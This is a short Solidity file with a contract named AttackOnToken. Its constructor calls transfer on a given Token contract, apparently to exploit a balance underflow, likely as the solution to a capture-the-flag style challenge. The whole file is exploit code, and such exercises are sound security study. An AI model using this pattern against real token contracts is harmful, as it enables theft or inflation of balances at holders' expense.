// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Token.sol";

contract AttackOnToken {
    constructor(address TokenAddress) {
        Token(TokenAddress).transfer(msg.sender,1);
    }
}
